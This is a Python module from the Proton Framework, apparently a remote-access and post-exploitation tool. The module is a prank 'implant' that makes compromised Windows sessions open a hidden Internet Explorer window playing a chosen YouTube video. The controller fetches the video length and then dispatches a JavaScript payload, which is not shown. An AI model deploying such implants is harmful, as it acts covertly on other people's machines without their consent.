#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import uuid
import urllib.request

class ThunderstruckJob(core.job.Job):
    def create(self):
        if self.session_id == -1:
            response = urllib.request.urlopen(self.options.get("VIDEOURL")).read().decode()
            ms = response.split('approxDurationMs\\":\\"')[1].split("\\")[0]
            seconds = int(ms)//1000
            self.options.set("SECONDS", str(seconds+1))

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed"
        #self.shell.print_plain(self.data)

class ThunderstruckImplant(core.implant.Implant):

    NAME = "YouTube"
    DESCRIPTION = "Opens hidden IE to the specified YouTube video."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/fun/youtube"

    def load(self):
        self.options.register("VIDEOURL", "https://www.youtube.com/watch?v=v2AC41dglnM", "YouTube video to play.")
        self.options.register("SECONDS", "", "Video length.", hidden=True)

    def run(self):
        self.shell.print_status("Retrieving video length...")
        response = urllib.request.urlopen(self.options.get("VIDEOURL")).read().decode()
        ms = response.split('approxDurationMs\\":\\"')[1].split("\\")[0]
        seconds = int(ms)//1000
        self.shell.print_info(f"Video length: {seconds} seconds.")

        self.options.set("SECONDS", str(seconds+1))

        payloads = {}
        #payloads["vbs"] = self.loader.load_script("data/implant/fun/thunderstruck.vbs", self.options)
        payloads["js"] = "data/implant/fun/youtube.js"

        self.dispatch(payloads, ThunderstruckJob)
